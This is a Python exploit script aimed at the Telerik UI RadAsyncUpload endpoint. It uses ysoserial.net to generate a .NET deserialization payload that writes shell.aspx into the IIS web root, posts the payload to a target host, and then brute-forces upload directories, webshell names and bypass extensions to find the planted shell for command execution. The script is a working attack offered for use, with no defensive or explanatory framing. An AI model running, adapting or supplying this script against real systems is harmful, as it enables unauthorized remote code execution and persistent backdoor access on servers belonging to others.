import requests
import base64
import subprocess

# 🔴 Target Details
TARGET_URL = "http://target.com/Telerik.Web.UI.WebResource.axd?type=rau"

# 🔍 Common directories where Telerik uploads files
UPLOAD_DIRS = [
    "/uploads/",
    "/UserFiles/",
    "/documents/",
    "/media/",
    "/files/",
    "/temp/",
    "/bundles/",
    "/Scripts/",
    "/app/",
    "/content/",
    "/downloads/",
    "/images/",
    "/errorPages/",
    "/documentation/",
    "/asp_client/",
    "/TelerikUpload/",
    "/assets/",
    "/public/"
]

# 🛠️ Webshell Filenames to Check
SHELL_NAMES = [
    "shell.aspx", "cmd.aspx", "backdoor.aspx", 
    "shell.asp", "webshell.aspx", "test.aspx"
]

# 🔄 Alternative Extensions for Bypasses
EXTENSIONS = ["", ".bak", ".txt", ";.txt"]

# 🛠️ Generates the Payload Using ysoserial.net
def generate_payload():
    cmd = ["mono", "ysoserial.exe", "-g", "TypeConfuseDelegate", "-f", "Json.Net", "-o", "base64",
           "-c", "echo 'webshell' > C:\\inetpub\\wwwroot\\uploads\\shell.aspx"]
    
    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return result.stdout.decode().strip()

# 🚀 Sends the Exploit to Telerik
def send_exploit(payload):
    headers = {"Content-Type": "application/octet-stream"}
    response = requests.post(TARGET_URL, data=payload, headers=headers, verify=False)

    if response.status_code == 200:
        print("[+] Exploit Sent! Scanning for the webshell...")
        scan_webshell()
    else:
        print("[-] Exploit failed, target may not be vulnerable.")

# 🔎 Scan for the Webshell in Common Directories
def scan_webshell():
    for directory in UPLOAD_DIRS:
        for filename in SHELL_NAMES:
            for ext in EXTENSIONS:
                url = f"http://target.com{directory}{filename}{ext}"
                response = requests.get(url, verify=False)
                if response.status_code == 200:
                    print(f"[🔥] Webshell Found: {url}")
                    print(f"    Run commands: {url}?cmd=whoami")
                    return
    print("[-] Webshell Not Found. Try manually scanning.")

# 🔥 Run the Attack
def main():
    print("[*] Generating payload...")
    raw_payload = generate_payload()

    print("[*] Sending exploit...")
    send_exploit(raw_payload)

if __name__ == "__main__":
    main()
